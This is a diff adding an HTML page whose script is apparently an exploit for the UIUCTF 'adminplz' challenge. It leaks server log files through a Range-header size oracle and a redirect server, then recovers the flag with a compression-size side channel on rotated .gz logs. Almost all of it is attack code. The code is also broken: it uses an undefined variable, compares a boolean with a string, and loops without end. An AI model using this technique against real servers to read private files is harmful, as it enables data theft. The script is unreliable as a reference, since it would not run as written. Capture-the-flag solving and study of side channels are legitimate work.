@@ -1,0 +1,74 @@
+<html>
+<head></head>
+<body>
+<script>
+const sleep = async (ms=100) => new Promise((res)=>setTimeout(res, ms));
+const HOST = "http://127.0.0.1:8080";
+const SELF = "http://127.0.0.1:5000";
+
+async function isGreaterThanSize(url, size) {
+    url = `${SELF}/redirect?url=${encodeURIComponent(url)}`
+    await fetch(`${HOST}/?view=${encodeURIComponent(url)}`, {mode: "cors", headers: {"Range": `bytes=${size}-`}});
+    await sleep();
+    const result = await fetch(`${SELF}/counter`).then(r=>r.text());
+    return result === "2"
+}
+
+async function leakSize(url, start=0, end=10000) {
+    if (start === end) return start;
+    let mid = Math.floor((start+end)/2);
+    if (await isGreaterThanSize(url, mid) === "true") {
+        return await leakSize(url, mid, end);
+    }
+    else {
+        return await leakSize(url, start, mid);
+    }
+}
+
+async function createSession(username) {
+    // have webserver create us a session w/ username
+    return await fetch(`${SELF}/session?username=${encodeURIComponent(username)}`).then(r=>r.text());
+    await sleep();
+}
+
+async function createLogLine(username) {
+    const s = await createSession(username);
+    //WARN  d.arxenix.adminplz.AdminApplication - illegal access attempt to uiuctf{????????????????????????} by user asdf
+    await fetch(`${HOST}/flag;jsessionid=${s}`);
+    await sleep();
+}
+
+async function main() {
+    const logFormat = "WARN  d.arxenix.adminplz.AdminApplication - user  [FE855864CB20F381ADBBBF8A11112658] attempted to access restricted view\n"
+    await createLogLine("a");
+    const logSize = await leakSize("file:///var/log/latest.log");
+    const flagLen = logSize - (logFormat.length + 1)
+    const logLineLen = logFormat.length + flagLen
+
+    // reset log
+    await createLogLine("A".repeat(1000 - (logLineLen + 1 + logLineLen)));
+
+    let currentLogIdx = 2;
+    let known = "";
+    let charset = "0123456789abcdef"
+    while(true) {
+        let [minSize, minC] = [10000, '?'];
+        for (let c of charset) {
+            let prefix = "illegal access attempt to uiuctf{" + known + c;
+            await createLogLine(pref + "A".repeat(1000 - (logLineLen - prefix.length)));
+            let compressedSize = await leakSize(`file:///var/log/log-${currentLogIdx}.gz`);
+            if (compressedSize < minSize) {
+                minSize = compressedSize;
+                minC = c;
+            }
+
+            currentLogIdx = 1 + ((currentLogIdx + 1) % 5)
+        }
+        known += minC;
+    }
+}
+
+main();
+</script>
+</body>
+</html>
